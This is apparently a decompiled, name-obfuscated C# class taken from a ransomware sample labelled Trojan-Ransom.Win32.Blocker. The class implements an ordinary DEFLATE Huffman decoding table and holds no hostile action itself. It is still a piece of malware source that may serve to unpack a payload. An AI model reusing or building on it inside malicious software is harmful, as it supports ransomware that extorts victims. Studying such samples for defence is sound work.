// Decompiled with JetBrains decompiler
// Type: ?1?.?31?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using \u003F15\u003F;
using System;

namespace \u003F1\u003F
{
  internal class \u003F31\u003F
  {
    private static int \u003F1\u003F = 15;
    private short[] \u003F1\u003F;
    public static \u003F31\u003F \u003F1\u003F;
    public static \u003F31\u003F \u003F15\u003F;

    static \u003F31\u003F()
    {
      try
      {
        byte[] numArray1 = new byte[288];
        int num1 = 0;
        while (num1 < 144)
          numArray1[num1++] = (byte) 8;
        while (num1 < 256)
          numArray1[num1++] = (byte) 9;
        while (num1 < 280)
          numArray1[num1++] = (byte) 7;
        while (num1 < 288)
          numArray1[num1++] = (byte) 8;
        \u003F31\u003F.\u003F1\u003F = new \u003F31\u003F(numArray1);
        byte[] numArray2 = new byte[32];
        int num2 = 0;
        while (num2 < 32)
          numArray2[num2++] = (byte) 5;
        \u003F31\u003F.\u003F15\u003F = new \u003F31\u003F(numArray2);
      }
      catch (Exception ex)
      {
        throw new ApplicationException(\u003F21\u003F.\u003F1\u003F(213374111, 596164981, 234735434));
      }
    }

    public \u003F31\u003F(byte[] _param1) => this.\u003F1\u003F(_param1);

    private void \u003F1\u003F(byte[] _param1)
    {
      int[] numArray1 = new int[\u003F31\u003F.\u003F1\u003F + 1];
      int[] numArray2 = new int[\u003F31\u003F.\u003F1\u003F + 1];
      for (int index1 = 0; index1 < _param1.Length; ++index1)
      {
        int index2 = (int) _param1[index1];
        if (index2 <= 0)
          continue;
        numArray1[index2]++;
      }
      int num1 = 0;
      int length = 512;
      for (int index = 1; index <= \u003F31\u003F.\u003F1\u003F; ++index)
      {
        numArray2[index] = num1;
        num1 += numArray1[index] << 16 - index;
        if (index < 10)
          continue;
        int num2 = numArray2[index] & 130944;
        int num3 = num1 & 130944;
        length += num3 - num2 >> 16 - index;
      }
      if (num1 != 65536)
        throw new Exception(\u003F21\u003F.\u003F1\u003F(389219862, 596164915, 234735442));
      this.\u003F1\u003F = new short[length];
      int num4 = 512;
      for (int index3 = \u003F31\u003F.\u003F1\u003F; index3 >= 10; --index3)
      {
        int num5 = num1 & 130944;
        num1 -= numArray1[index3] << 16 - index3;
        for (int index4 = num1 & 130944; index4 < num5; index4 += 128)
        {
          this.\u003F1\u003F[(int) \u003F52\u003F.\u003F1\u003F(index4)] = (short) (-num4 << 4 | index3);
          num4 += 1 << index3 - 9;
        }
      }
      for (int index5 = 0; index5 < _param1.Length; ++index5)
      {
        int index6 = (int) _param1[index5];
        if (index6 == 0)
          continue;
        int num6 = numArray2[index6];
        int index7 = (int) \u003F52\u003F.\u003F1\u003F(num6);
        if (index6 <= 9)
        {
          do
          {
            this.\u003F1\u003F[index7] = (short) (index5 << 4 | index6);
            index7 += 1 << index6;
          }
          while (index7 < 512);
        }
        else
        {
          int num7 = (int) this.\u003F1\u003F[index7 & 511];
          int num8 = 1 << (num7 & 15);
          int num9 = -(num7 >> 4);
          do
          {
            this.\u003F1\u003F[num9 | index7 >> 9] = (short) (index5 << 4 | index6);
            index7 += 1 << index6;
          }
          while (index7 < num8);
        }
        numArray2[index6] = num6 + (1 << 16 - index6);
      }
    }

    public int \u003F1\u003F(\u003F48\u003F _param1)
    {
      int index;
      if ((index = _param1.\u003F1\u003F(9)) < 0)
      {
        int num1 = _param1.\u0020();
        int num2 = (int) this.\u003F1\u003F[_param1.\u003F1\u003F(num1)];
        if (num2 < 0 || (num2 & 15) > num1)
          return -1;
        _param1.\u003F15\u003F(num2 & 15);
        return num2 >> 4;
      }
      int num3;
      if ((num3 = (int) this.\u003F1\u003F[index]) < 0)
      {
        int num4 = -(num3 >> 4);
        int num5 = num3 & 15;
        int num6;
        if ((num6 = _param1.\u003F1\u003F(num5)) < 0)
        {
          int num7 = _param1.\u0020();
          int num8 = _param1.\u003F1\u003F(num7);
          int num9 = (int) this.\u003F1\u003F[num4 | num8 >> 9];
          if ((num9 & 15) > num7)
            return -1;
          _param1.\u003F15\u003F(num9 & 15);
          return num9 >> 4;
        }
        int num10 = (int) this.\u003F1\u003F[num4 | num6 >> 9];
        _param1.\u003F15\u003F(num10 & 15);
        return num10 >> 4;
      }
      _param1.\u003F15\u003F(num3 & 15);
      return num3 >> 4;
    }
  }
}
